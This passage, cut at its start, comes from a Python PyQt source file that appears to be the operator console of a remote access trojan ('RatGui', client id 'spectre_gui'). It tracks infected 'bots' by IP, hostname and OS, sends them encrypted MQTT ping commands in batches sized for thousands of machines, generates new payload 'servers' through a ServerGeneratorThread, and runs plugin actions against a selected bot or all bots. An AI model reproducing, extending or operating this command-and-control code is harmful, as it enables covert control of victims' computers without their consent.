            self.add_bots = True

        update = {
            'id': bot_id,
            'ip': ip,
            'hostname': hostname,
            'os': os_info,
            'status': 'Connected',
            'last_ping': QDateTime.currentDateTime().toString(),
            'target': target
        }

        self.device_table_updates.append(update)
        self.device_table_changed = True

    def open_settings(self):
        try:
            dialog = SettingsDialog(self, self.broker_history, self.topic, self.encryption_key, sound_enabled=self.sound_enabled, sound_cooldown=self.sound_cooldown, logging_enabled=getattr(self,'logging_enabled',True), log_level=getattr(self,'log_level','INFO'), presence_verbose=getattr(self,'presence_verbose', False))
            if dialog.exec():
                self.broker_url = dialog.broker_url.currentText()
                self.broker_port = int(dialog.broker_port.text())
                self.topic = dialog.topic.text()
                self.encryption_key = dialog.encryption_key.text()
                # read sound settings
                try:
                    self.sound_enabled = bool(dialog.sound_enabled_cb.isChecked())
                    self.sound_cooldown = int(dialog.sound_cooldown_sb.value())
                except Exception:
                    pass
                # read logging settings
                try:
                    self.logging_enabled = bool(dialog.logging_enabled_cb.isChecked())
                    self.log_level = str(dialog.log_level_cb.currentText())
                    import logging
                    levels = {'DEBUG': 10, 'INFO': 20, 'WARNING': 30, 'ERROR': 40}
                    logging.getLogger().setLevel(levels.get(self.log_level, 20))
                except Exception:
                    pass
                # read presence verbose setting
                try:
                    self.presence_verbose = bool(dialog.presence_verbose_cb.isChecked())
                except Exception:
                    pass
                self.save_settings()
                if self.broker_url not in self.broker_history:
                    self.broker_history.append(self.broker_url)
                self.client.disconnect()
                self.client.loop_stop()
                self.client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5, client_id=f"spectre_gui_{uuid.uuid4()}")
                self.client.on_connect = self.on_connect
                self.client.on_message = self.on_message
                self.client.on_disconnect = self.on_disconnect
                self.client.on_log = self.on_log
                self.connect_to_broker()
        except Exception as e:
            self.log_buffered(f"Error in open_settings: {e}")

    def create_server(self):
        try:
            dialog = ServerDialog('Create Server', self, self.topic, self.encryption_key)
            if dialog.exec():
                server_info = dialog.get_server_info()
                server_info.update({
                    'broker_url': self.broker_url,
                    'broker_port': self.broker_port,
                })
                self.create_server_button.setEnabled(False)
                self.generator_thread = ServerGeneratorThread(server_info)
                self.generator_thread.finished.connect(self.on_server_generation_finished)
                self.generator_thread.start()
        except Exception as e:
            self.log_buffered(f"Error in create_server: {e}")

    def on_server_generation_finished(self, message):
        self.log_buffered(message)
        self.create_server_button.setEnabled(True)

    def update_device_table(self, data):
        try:
            bot_id = data['id']
            ip = data.get('ip', 'Unknown')
            os_info = data.get('os', 'Unknown')
            hostname = data.get('hostname', 'Unknown')
            target = f"{ip}:{bot_id}"
            found = False
            for row in range(self.device_model.device_count()):
                device = self.device_model.device_at(row)
                if not device:
                    continue
                table_target = device.get('target')
                if table_target == target:
                    self.device_table_updates.append({
                        'id': bot_id,
                        'ip': ip,
                        'hostname': hostname,
                        'os': os_info,
                        'status': 'Connected',
                        'last_ping': QDateTime.currentDateTime().toString(),
                        'target': target
                    })
                    found = True
                    break
            if not found:
                self.device_table_updates.append({
                    'id': bot_id,
                    'ip': ip,
                    'hostname': hostname,
                    'os': os_info,
                    'status': 'Connected',
                    'last_ping': QDateTime.currentDateTime().toString(),
                    'target': target
                })
            self.device_table_changed = True
        except Exception as e:
            self.log_buffered(f"Error updating device table: {e}")

    def _presence_tick(self):
        """Send ping commands in batches so that each device is pinged at least
        once during `presence_window` seconds. This avoids marking live devices
        as disconnected when the UI is maintaining thousands of entries.
        """
        try:
            total = self.device_model.device_count()
            if total == 0:
                return
            # Number of devices we must ping per second to cover the entire fleet
            # within presence_window seconds
            batch_size = max(1, math.ceil(total / max(1, self.presence_window)))
            # Send pings for the next batch
            for i in range(batch_size):
                idx = (self._presence_index + i) % total
                device = self.device_model.device_at(idx)
                if not device:
                    continue
                target = device.get('target')
                if not target:
                    continue
                # Send a lightweight ping command; transport will queue if disconnected
                try:
                    cmd = {'type': 'command', 'target': target, 'action': 'ping'}
                    self.transport.send_command(cmd, encrypt=True)
                    # verbose tracking
                    try:
                        if getattr(self, 'presence_verbose', False):
                            self._presence_pings_sent += 1
                    except Exception:
                        pass
                except Exception as e:
                    # log but don't spam
                    if i == 0:
                        self.log_buffered(f"Presence ping error: {e}")
                    continue
            # advance pointer
            self._presence_index = (self._presence_index + batch_size) % max(1, total)
        except Exception as e:
            self.log_buffered(f"Error in presence tick: {e}")
        finally:
            # Emit periodic verbose presence log if enabled (every 5 seconds)
            try:
                if getattr(self, 'presence_verbose', False):
                    now = time.time()
                    if now - self._presence_log_last >= 5:
                        self.log_buffered(f"Presence: sent {self._presence_pings_sent} pings over last {int(now - self._presence_log_last)}s (batch_size={batch_size})")
                        self._presence_pings_sent = 0
                        self._presence_log_last = now
            except Exception:
                pass

    def show_context_menu(self, position):
        try:
            menu = QMenu()
            # Determine selected target via model; handle signals from both
            # the view (`device_view`) and the shim (`device_table`). Use
            # the view's selectionModel for robustness.
            sender = self.sender()
            sel_model = None
            try:
                sel_model = self.device_view.selectionModel()
            except Exception:
                try:
                    sel_model = self.device_table.selectionModel()
                except Exception:
                    sel_model = None

            selection = sel_model.selectedRows() if sel_model is not None else []
            if selection:
                row = selection[0].row()
                device = self.device_model.device_at(row)
                target = device.get('target', 'all') if device else 'all'
            else:
                # If no selection, try to resolve the row under the cursor
                try:
                    idx = self.device_view.indexAt(position)
                    if idx.isValid():
                        row = idx.row()
                        device = self.device_model.device_at(row)
                        target = device.get('target', 'all') if device else 'all'
                    else:
                        target = 'all'
                except Exception:
                    target = 'all'
            # Log resolved target to help debug incorrect 'all' cases
            try:
                self.log_buffered(f"Context menu target resolved: {target}")
            except Exception:
                pass
            self.log_buffered(f"Total plugins loaded: {len(self.plugins)}")
            categories = {}
            seen_actions = {}

            def _safe_execute(plugin, target):
                try:
                    plugin.execute(target)
                except Exception as _e:
                    try:
                        self.log_buffered(f"Plugin execution error ({getattr(plugin, 'name', 'unknown')}): {_e}")
                    except Exception:
                        pass

            # Respect the plugin load order (plugins are already ordered by priority in the loader)
            # Iterate in reverse so menu items appear in loader priority order visually.
            for plugin in reversed(self.plugins):
                category = getattr(plugin, 'category', 'Other')
                action_name = plugin.get_menu_action()

                # Deduplicate menu entries by action name. Prefer non-External category
                # or higher priority plugins when a collision occurs.
                if action_name in seen_actions:
                    existing = seen_actions[action_name]
                    existing_cat = getattr(existing, 'category', 'Other')
                    # If existing is External and this one is not, replace it
                    if existing_cat == 'External' and category != 'External':
                        seen_actions[action_name] = plugin
                    # If both same category, prefer higher priority
                    elif getattr(plugin, 'priority', 0) > getattr(existing, 'priority', 0):
                        seen_actions[action_name] = plugin
                    # otherwise keep existing and skip adding
                    continue
                else:
                    seen_actions[action_name] = plugin

                if category not in categories:
                    categories[category] = menu.addMenu(category)

                action = categories[category].addAction(action_name)
                # Bind the plugin object to a local variable to avoid lookup timing issues
                plugin_for_action = seen_actions[action_name]
                # Log the mapping so we can debug clicks that appear to do nothing
                try:
                    self.log_buffered(f"Menu mapping: '{action_name}' -> plugin='{getattr(plugin_for_action, 'name', repr(plugin_for_action))}' category='{category}' priority={getattr(plugin_for_action, 'priority', 0)}")
                except Exception:
                    pass
                # Use a bound lambda that calls a safe executor to ensure errors are logged
                action.triggered.connect(lambda checked, t=target, p=plugin_for_action: _safe_execute(p, t))
            # Determine where to show the menu: if the sender is the device view
            # or shim, map to its global coordinates; otherwise map to toolbar.
            try:
                if sender in (self.device_view, self.device_table):
                    # Position may be relative to the view
                    menu.exec(self.device_view.mapToGlobal(position))
                else:
                    menu.exec(self.toolbar.mapToGlobal(position))
            except Exception:
                try:
                    menu.exec(self.toolbar.mapToGlobal(position))
                except Exception:
                    menu.exec(self.device_view.mapToGlobal(position))
        except Exception as e:
            self.log_buffered(f"Error showing context menu: {e}")

    def remove_device_from_table(self, ip, bot_id, remove_from_all_bots=False):
        try:
            target = f"{ip}:{bot_id}"
            self.timer.stop()
            # Use model to remove row by target
            if remove_from_all_bots:
                self.all_bots = [bot for bot in self.all_bots if bot['id'] != bot_id or bot['ip'] != ip]
                self.remove_bots = True
            try:
                removed = self.device_model.remove_by_target(target)
            except Exception:
                removed = False
            if removed and target in self.device_status:
                del self.device_status[target]
            self.device_table_changed = True
        except Exception as e:
            self.log_buffered(f"Error removing device from table: {e}")
        finally:
            self.timer.start(10000)

    def show_log_context_menu(self, position):
        try:
            menu = QMenu()
            clear_action = menu.addAction('Clear Log')
            action = menu.exec(self.log_area.mapToGlobal(position))
            if action == clear_action:
                self.log_area.clear()
        except Exception as e:
            self.log_buffered(f"Error showing log context menu: {e}")

    def update_device_status(self):
        try:
            current_time = QDateTime.currentDateTime()
            table_changed = False
            # Iterate model rows for status updates
            for row in range(self.device_model.device_count()):
                device = self.device_model.device_at(row)
                if not device:
                    continue
                target = device.get('target')
                if target in self.device_status:
                    last_beacon = self.device_status[target].get('last_beacon')
                    if not hasattr(last_beacon, 'secsTo'):
                        continue
                    seconds_ago = last_beacon.secsTo(current_time)
                    new_status = 'Connected' if seconds_ago < 30 else 'Disconnected'
                    old_status = self.device_status[target]['status']
                    if old_status != new_status:
                        self.device_status[target]['status'] = new_status
                        self.update_connected_count()
                        table_changed = True
                    # update model entry (this will emit dataChanged)
                    last_ping_text = f"{seconds_ago} sec ago" if new_status == 'Connected' and seconds_ago < 30 else last_beacon.toString()
                    self.device_model.update_or_insert({
                        'target': target,
                        'status': new_status,
                        'last_ping': last_ping_text,
                    })
            if table_changed:
                self.device_table_changed = True
        except Exception as e:
            self.log_buffered(f"Error updating device status: {e}")

    def update_connected_count(self):
        try:
            if os.path.exists(self.json_file):
                with open(self.json_file, 'r') as f:
                    bots = json.load(f)
                self.connected_bots_count = 0
                for bot in bots:
                    bot_id = bot['id']
                    ip = bot.get('ip', 'Unknown')
                    target = f"{ip}:{bot_id}"
                    if target in self.device_status and self.device_status[target]['status'] == 'Connected':
                        self.connected_bots_count += 1
                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
        except Exception as e:
            self.log_buffered(f"Error updating connected count: {e}")

    def closeEvent(self, event):
        """Cleanup on application close: deactivate plugins and stop transport."""
        try:
            # Deactivate plugins
            for plugin in getattr(self, 'plugins', []):
                try:
                    if hasattr(plugin, 'deactivate') and callable(plugin.deactivate):
                        plugin.deactivate()
                except Exception as e:
                    self.log_buffered(f"Error deactivating plugin {getattr(plugin,'name',str(plugin))}: {e}")
            # Stop transport background tasks
            if hasattr(self, 'transport') and hasattr(self.transport, 'stop'):
                try:
                    self.transport.stop()
                except Exception as e:
                    self.log_buffered(f"Error stopping transport: {e}")
        except Exception as e:
            print(f"Error in closeEvent cleanup: {e}")
        finally:
            super().closeEvent(event)

def exception_hook(exctype, value, traceback_info):
    error_msg = ''.join(traceback.format_exception(exctype, value, traceback_info))
    print(f"Unhandled exception caught:\n{error_msg}")
    try:
        window.log_buffered(f"Unhandled exception: {error_msg}")
    except:
        pass

sys.excepthook = exception_hook

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RatGui()
    window.show()
    sys.exit(app.exec())